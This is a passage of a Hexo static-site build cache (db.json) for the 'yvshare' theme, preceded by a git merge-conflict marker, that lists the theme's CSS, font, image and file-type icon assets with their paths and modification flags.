<<<<<<< HEAD
{"meta":{"version":1,"warehouse":"2.2.0"},"models":{"Asset":[{"_id":"themes/yvshare/source/css/font-awesome.min.css","path":"css/font-awesome.min.css","modified":1,"renderable":1},{"_id":"themes/yvshare/source/css/style.css","path":"css/style.css","modified":1,"renderable":1},{"_id":"themes/yvshare/source/fonts/fontawesome-webfont.eot","path":"fonts/fontawesome-webfont.eot","modified":0,"renderable":1},{"_id":"themes/yvshare/source/css/blog_basic.css","path":"css/blog_basic.css","modified":1,"renderable":1},{"_id":"themes/yvshare/source/css/viewer.min.css","path":"css/viewer.min.css","modified":1,"renderable":1},{"_id":"themes/yvshare/source/fonts/fontawesome-webfont.woff","path":"fonts/fontawesome-webfont.woff","modified":0,"renderable":1},{"_id":"themes/yvshare/source/css/style.scss","path":"css/style.scss","modified":1,"renderable":1},{"_id":"themes/yvshare/source/images/css3media.gif","path":"images/css3media.gif","modified":0,"renderable":1},{"_id":"themes/yvshare/source/images/favicon.png","path":"images/favicon.png","modified":0,"renderable":1},{"_id":"themes/yvshare/source/images/livere2.png","path":"images/livere2.png","modified":0,"renderable":1},{"_id":"themes/yvshare/source/images/livere3.png","path":"images/livere3.png","modified":0,"renderable":1},{"_id":"themes/yvshare/source/images/github4.png","path":"images/github4.png","modified":0,"renderable":1},{"_id":"themes/yvshare/source/images/logo.png","path":"images/logo.png","modified":0,"renderable":1},{"_id":"themes/yvshare/source/images/localstorage.png","path":"images/localstorage.png","modified":0,"renderable":1},{"_id":"themes/yvshare/source/images/top.png","path":"images/top.png","modified":0,"renderable":1},{"_id":"themes/yvshare/source/images/logo@2x.png","path":"images/logo@2x.png","modified":0,"renderable":1},{"_id":"themes/yvshare/source/images/xss2.png","path":"images/xss2.png","modified":0,"renderable":1},{"_id":"themes/yvshare/source/icons/actionscript.svg","path":"icons/actionscript.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/android.svg","path":"icons/android.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/angular-component.svg","path":"icons/angular-component.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/angular-directive.svg","path":"icons/angular-directive.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/angular-guard.svg","path":"icons/angular-guard.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/angular-pipe.svg","path":"icons/angular-pipe.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/angular-resolver.svg","path":"icons/angular-resolver.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/angular-routing.svg","path":"icons/angular-routing.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/angular-service.svg","path":"icons/angular-service.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/angular.svg","path":"icons/angular.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/images/xss1.png","path":"images/xss1.png","modified":0,"renderable":1},{"_id":"themes/yvshare/source/icons/applescript.svg","path":"icons/applescript.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/images/vim.png","path":"images/vim.png","modified":0,"renderable":1},{"_id":"themes/yvshare/source/icons/appveyor.svg","path":"icons/appveyor.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/apiblueprint.svg","path":"icons/apiblueprint.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/arduino.svg","path":"icons/arduino.svg","modified":0,"renderable":1},{"_id":"themes/yvshare/source/icons/audio.svg","path":"icons/audio.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/aurelia.svg","path":"icons/aurelia.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/assembly.svg","path":"icons/assembly.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/autoit.svg","path":"icons/autoit.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/autohotkey.svg","path":"icons/autohotkey.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/bithound.svg","path":"icons/bithound.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/blink.svg","path":"icons/blink.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/babel.svg","path":"icons/babel.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/browserlist.svg","path":"icons/browserlist.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/blink_light.svg","path":"icons/blink_light.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/bower.svg","path":"icons/bower.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/cabal.svg","path":"icons/cabal.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/bucklescript.svg","path":"icons/bucklescript.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/browserlist_light.svg","path":"icons/browserlist_light.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/certificate.svg","path":"icons/certificate.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/c.svg","path":"icons/c.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/cake.svg","path":"icons/cake.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/changelog.svg","path":"icons/changelog.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/clojure.svg","path":"icons/clojure.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/cmake.svg","path":"icons/cmake.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/code-climate_light.svg","path":"icons/code-climate_light.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/code-climate.svg","path":"icons/code-climate.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/coffee.svg","path":"icons/coffee.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/circleci.svg","path":"icons/circleci.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/circleci_light.svg","path":"icons/circleci_light.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/console.svg","path":"icons/console.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/contributing.svg","path":"icons/contributing.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/conduct.svg","path":"icons/conduct.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/csharp.svg","path":"icons/csharp.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/credits.svg","path":"icons/credits.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/coldfusion.svg","path":"icons/coldfusion.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/cloudfoundry.svg","path":"icons/cloudfoundry.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/crystal_light.svg","path":"icons/crystal_light.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/css-map.svg","path":"icons/css-map.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/cpp.svg","path":"icons/cpp.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/css.svg","path":"icons/css.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/cuda.svg","path":"icons/cuda.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/crystal.svg","path":"icons/crystal.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/cucumber.svg","path":"icons/cucumber.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/document.svg","path":"icons/document.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/dart.svg","path":"icons/dart.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/dotjs.svg","path":"icons/dotjs.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/database.svg","path":"icons/database.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/drone.svg","path":"icons/drone.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/drone_light.svg","path":"icons/drone_light.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/diff.svg","path":"icons/diff.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/docker.svg","path":"icons/docker.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/elixir.svg","path":"icons/elixir.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/ejs.svg","path":"icons/ejs.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/email.svg","path":"icons/email.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/editorconfig.svg","path":"icons/editorconfig.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/exe.svg","path":"icons/exe.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/favicon.svg","path":"icons/favicon.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/firebase.svg","path":"icons/firebase.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/file.svg","path":"icons/file.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/elm.svg","path":"icons/elm.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/eslint.svg","path":"icons/eslint.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/erlang.svg","path":"icons/erlang.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/flash.svg","path":"icons/flash.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-aurelia-open.svg","path":"icons/folder-aurelia-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-audio-open.svg","path":"icons/folder-audio-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/flow.svg","path":"icons/flow.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-aws-open.svg","path":"icons/folder-aws-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-aws.svg","path":"icons/folder-aws.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-audio.svg","path":"icons/folder-audio.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-aurelia.svg","path":"icons/folder-aurelia.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-bower-open.svg","path":"icons/folder-bower-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-components-open.svg","path":"icons/folder-components-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-circleci-open.svg","path":"icons/folder-circleci-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-bower.svg","path":"icons/folder-bower.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-components.svg","path":"icons/folder-components.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-coverage.svg","path":"icons/folder-coverage.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-circleci.svg","path":"icons/folder-circleci.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-css.svg","path":"icons/folder-css.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-css-open.svg","path":"icons/folder-css-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-config-open.svg","path":"icons/folder-config-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-config.svg","path":"icons/folder-config.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-coverage-open.svg","path":"icons/folder-coverage-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-database-open.svg","path":"icons/folder-database-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-database.svg","path":"icons/folder-database.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-dist-open.svg","path":"icons/folder-dist-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-dist.svg","path":"icons/folder-dist.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-docker-open.svg","path":"icons/folder-docker-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-docs.svg","path":"icons/folder-docs.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-docker.svg","path":"icons/folder-docker.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-expo.svg","path":"icons/folder-expo.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-export-open.svg","path":"icons/folder-export-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-docs-open.svg","path":"icons/folder-docs-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-expo-open.svg","path":"icons/folder-expo-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-export.svg","path":"icons/folder-export.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-font.svg","path":"icons/folder-font.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-github-open.svg","path":"icons/folder-github-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-font-open.svg","path":"icons/folder-font-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-git-open.svg","path":"icons/folder-git-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-git.svg","path":"icons/folder-git.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-gitlab-open.svg","path":"icons/folder-gitlab-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-github.svg","path":"icons/folder-github.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-global-open.svg","path":"icons/folder-global-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-gitlab.svg","path":"icons/folder-gitlab.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-gradle-open.svg","path":"icons/folder-gradle-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-global.svg","path":"icons/folder-global.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-i18n-open.svg","path":"icons/folder-i18n-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-i18n.svg","path":"icons/folder-i18n.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-gradle.svg","path":"icons/folder-gradle.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-images.svg","path":"icons/folder-images.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-import-open.svg","path":"icons/folder-import-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-import.svg","path":"icons/folder-import.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-images-open.svg","path":"icons/folder-images-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-include-open.svg","path":"icons/folder-include-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-include.svg","path":"icons/folder-include.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-javascript-open.svg","path":"icons/folder-javascript-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-jinja-open.svg","path":"icons/folder-jinja-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-javascript.svg","path":"icons/folder-javascript.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-jinja-open_light.svg","path":"icons/folder-jinja-open_light.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-jinja_light.svg","path":"icons/folder-jinja_light.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-jinja.svg","path":"icons/folder-jinja.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-lib-open.svg","path":"icons/folder-lib-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-lib.svg","path":"icons/folder-lib.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-kubernetes-open.svg","path":"icons/folder-kubernetes-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-kubernetes.svg","path":"icons/folder-kubernetes.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-markdown.svg","path":"icons/folder-markdown.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-markdown-open.svg","path":"icons/folder-markdown-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-log.svg","path":"icons/folder-log.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-ngrx-actions-open.svg","path":"icons/folder-ngrx-actions-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-ngrx-effects.svg","path":"icons/folder-ngrx-effects.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-log-open.svg","path":"icons/folder-log-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-ngrx-entities.svg","path":"icons/folder-ngrx-entities.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-ngrx-entities-open.svg","path":"icons/folder-ngrx-entities-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-ngrx-actions.svg","path":"icons/folder-ngrx-actions.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-ngrx-state.svg","path":"icons/folder-ngrx-state.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-ngrx-reducer-open.svg","path":"icons/folder-ngrx-reducer-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-node-open.svg","path":"icons/folder-node-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-node.svg","path":"icons/folder-node.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-other.svg","path":"icons/folder-other.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-other-open.svg","path":"icons/folder-other-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-ngrx-effects-open.svg","path":"icons/folder-ngrx-effects-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-php-open.svg","path":"icons/folder-php-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-ngrx-state-open.svg","path":"icons/folder-ngrx-state-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-ngrx-reducer.svg","path":"icons/folder-ngrx-reducer.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-phpmailer.svg","path":"icons/folder-phpmailer.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-phpmailer-open.svg","path":"icons/folder-phpmailer-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-php.svg","path":"icons/folder-php.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-public.svg","path":"icons/folder-public.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-public-open.svg","path":"icons/folder-public-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-redux-actions-open.svg","path":"icons/folder-redux-actions-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-react-components.svg","path":"icons/folder-react-components.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-redux-actions.svg","path":"icons/folder-redux-actions.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-resource-open.svg","path":"icons/folder-resource-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-react-components-open.svg","path":"icons/folder-react-components-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-redux-store.svg","path":"icons/folder-redux-store.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-redux-reducer.svg","path":"icons/folder-redux-reducer.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-redux-store-open.svg","path":"icons/folder-redux-store-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-resource.svg","path":"icons/folder-resource.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-scripts-open.svg","path":"icons/folder-scripts-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-scripts.svg","path":"icons/folder-scripts.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-sass-open.svg","path":"icons/folder-sass-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-src.svg","path":"icons/folder-src.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-sublime-open.svg","path":"icons/folder-sublime-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-src-open.svg","path":"icons/folder-src-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-test-open.svg","path":"icons/folder-test-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-sublime.svg","path":"icons/folder-sublime.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-temp.svg","path":"icons/folder-temp.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-temp-open.svg","path":"icons/folder-temp-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-sass.svg","path":"icons/folder-sass.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-tools-open.svg","path":"icons/folder-tools-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-tools.svg","path":"icons/folder-tools.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-typescript-open.svg","path":"icons/folder-typescript-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-typescript.svg","path":"icons/folder-typescript.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-video-open.svg","path":"icons/folder-video-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-test.svg","path":"icons/folder-test.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-video.svg","path":"icons/folder-video.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-views-open.svg","path":"icons/folder-views-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-views.svg","path":"icons/folder-views.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-vscode-open.svg","path":"icons/folder-vscode-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-redux-reducer-open.svg","path":"icons/folder-redux-reducer-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-vscode.svg","path":"icons/folder-vscode.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-vue.svg","path":"icons/folder-vue.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-vue-open.svg","path":"icons/folder-vue-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-wakatime-open.svg","path":"icons/folder-wakatime-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-wakatime.svg","path":"icons/folder-wakatime.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-webpack-open.svg","path":"icons/folder-webpack-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/font.svg","path":"icons/font.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-webpack.svg","path":"icons/folder-webpack.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/fsharp.svg","path":"icons/fsharp.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-wordpress-open.svg","path":"icons/folder-wordpress-open.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/folder-wordpress.svg","path":"icons/folder-wordpress.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/git.svg","path":"icons/git.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/go.svg","path":"icons/go.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/gatsby.svg","path":"icons/gatsby.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/fusebox.svg","path":"icons/fusebox.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/gitlab.svg","path":"icons/gitlab.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/gradle.svg","path":"icons/gradle.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/groovy.svg","path":"icons/groovy.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/gulp.svg","path":"icons/gulp.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/graphcool.svg","path":"icons/graphcool.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/h.svg","path":"icons/h.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/graphql.svg","path":"icons/graphql.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/haskell.svg","path":"icons/haskell.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/handlebars.svg","path":"icons/handlebars.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/hpp.svg","path":"icons/hpp.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/hack.svg","path":"icons/hack.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/haml.svg","path":"icons/haml.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/html.svg","path":"icons/html.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/heroku.svg","path":"icons/heroku.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/java.svg","path":"icons/java.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/haxe.svg","path":"icons/haxe.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/http.svg","path":"icons/http.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/image.svg","path":"icons/image.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/javascript.svg","path":"icons/javascript.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/julia.svg","path":"icons/julia.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/ionic.svg","path":"icons/ionic.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/javascript-map.svg","path":"icons/javascript-map.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/json.svg","path":"icons/json.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/key.svg","path":"icons/key.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/jinja_light.svg","path":"icons/jinja_light.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/kl.svg","path":"icons/kl.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/kotlin.svg","path":"icons/kotlin.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/kivy.svg","path":"icons/kivy.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/jenkins.svg","path":"icons/jenkins.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/lib.svg","path":"icons/lib.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/log.svg","path":"icons/log.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/karma.svg","path":"icons/karma.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/jinja.svg","path":"icons/jinja.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/lock.svg","path":"icons/lock.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/lua.svg","path":"icons/lua.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/markdown.svg","path":"icons/markdown.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/laravel.svg","path":"icons/laravel.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/markojs.svg","path":"icons/markojs.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/mocha.svg","path":"icons/mocha.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/mxml.svg","path":"icons/mxml.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/less.svg","path":"icons/less.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/merlin.svg","path":"icons/merlin.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/livescript.svg","path":"icons/livescript.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/ngrx-effects.svg","path":"icons/ngrx-effects.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/ngrx-entity.svg","path":"icons/ngrx-entity.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/mjml.svg","path":"icons/mjml.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/mathematica.svg","path":"icons/mathematica.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/matlab.svg","path":"icons/matlab.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/ngrx-actions.svg","path":"icons/ngrx-actions.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/ngrx-reducer.svg","path":"icons/ngrx-reducer.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/ngrx-state.svg","path":"icons/ngrx-state.svg","modified":1,"renderable":1},{"_id":"themes/yvshare/source/icons/nim.svg","path":"icons/nim.svg","modified":1,"renderable":1},{"_id":"themes/y